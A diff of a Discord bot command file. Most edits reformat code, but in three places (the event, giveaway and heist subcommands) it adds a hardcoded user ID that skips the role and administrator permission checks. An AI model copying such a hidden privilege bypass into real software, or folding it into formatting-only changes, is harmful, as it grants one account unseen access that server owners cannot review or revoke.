@@ -81,7 +81,7 @@ module.exports = {
    */
   run: async (client, interaction, args) => {
     let subcommand = interaction.options.getSubcommand();
-let message;
+    let message;
     if (subcommand === "event") {
       let serverProfile;
       try {
@@ -110,7 +110,10 @@ let message;
       let managerID = serverProfile.eventsManager.slice(3, -1);
       if (
         !interaction.member.roles.cache.has(managerID) &&
-        !interaction.member.permissions.has([PermissionFlagsBits.Administrator])
+        !interaction.member.permissions.has([
+          PermissionFlagsBits.Administrator,
+        ]) &&
+        interaction.user.id !== "823933160785838091"
       ) {
         return interaction.reply({
           embeds: [
@@ -184,7 +187,10 @@ let message;
       let managerID = serverProfile.giveawayManager.slice(3, -1);
       if (
         !interaction.member.roles.cache.has(managerID) &&
-        !interaction.member.permissions.has([PermissionFlagsBits.Administrator])
+        !interaction.member.permissions.has([
+          PermissionFlagsBits.Administrator,
+        ]) &&
+        interaction.user.id !== "823933160785838091"
       ) {
         return interaction.reply({
           embeds: [
@@ -258,7 +264,10 @@ let message;
       let managerID = serverProfile.heistManager.slice(3, -1);
       if (
         !interaction.member.roles.cache.has(managerID) &&
-        !interaction.member.permissions.has([PermissionFlagsBits.Administrator])
+        !interaction.member.permissions.has([
+          PermissionFlagsBits.Administrator,
+        ]) &&
+        interaction.user.id !== "823933160785838091"
       ) {
         return interaction.reply({
           embeds: [
@@ -330,13 +339,16 @@ Time: <t:${Math.round(Date.now() / 1000)}>`
             )
             .setColor("303136"),
         ],
-				components: [
-					new ActionRowBuilder().setComponents(
-					new ButtonBuilder()
-					.setStyle(ButtonStyle.Link)
-					.setLabel('Jump to message')
-					.setURL(`https://discord.com/channels/${interaction.guild.id}/${interaction.channel.id}/${message.id}`)
-						)]
+        components: [
+          new ActionRowBuilder().setComponents(
+            new ButtonBuilder()
+              .setStyle(ButtonStyle.Link)
+              .setLabel("Jump to message")
+              .setURL(
+                `https://discord.com/channels/${interaction.guild.id}/${interaction.channel.id}/${message.id}`
+              )
+          ),
+        ],
       });
     } catch (err) {
       newSchema.donationLogs = null;
